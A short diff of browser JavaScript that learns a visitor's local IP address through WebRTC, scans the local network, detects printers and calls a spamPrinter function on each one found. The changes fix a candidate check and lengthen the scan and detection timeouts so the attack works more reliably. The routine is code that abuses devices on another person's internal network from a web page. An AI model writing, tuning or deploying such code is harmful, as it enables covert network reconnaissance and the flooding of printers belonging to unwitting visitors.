@@ -151,7 +151,7 @@ execute = function() {
         pc.onicecandidate = function(ice) {
 
             //skip non-candidate events
-            if (ice.candidate)
+            if (ice.candidate && ice.candidate.candidate)
                 handleCandidate(ice.candidate.candidate);
         };
 
@@ -168,16 +168,17 @@ execute = function() {
     }
 
     var out = document.getElementById('log');
-    var timeout = 700;
+    var timeout = 750;
+    var detectPrinterTimeout = timeout * 2;
     var foundIp = false;
-    var findIpTimeout = 100;
+    var findIpTimeout = 200;
     
     out.innerText += '\nexecuting';
     
     getIPs(function(localIp) {
         doScan(localIp, timeout, function(ip) {
             foundIp = true;
-            detectPrinter(ip, timeout, function() {
+            detectPrinter(ip, detectPrinterTimeout, function() {
                 out.innerText += '\nprinter: ' + ip;
                 spamPrinter(ip);
             });
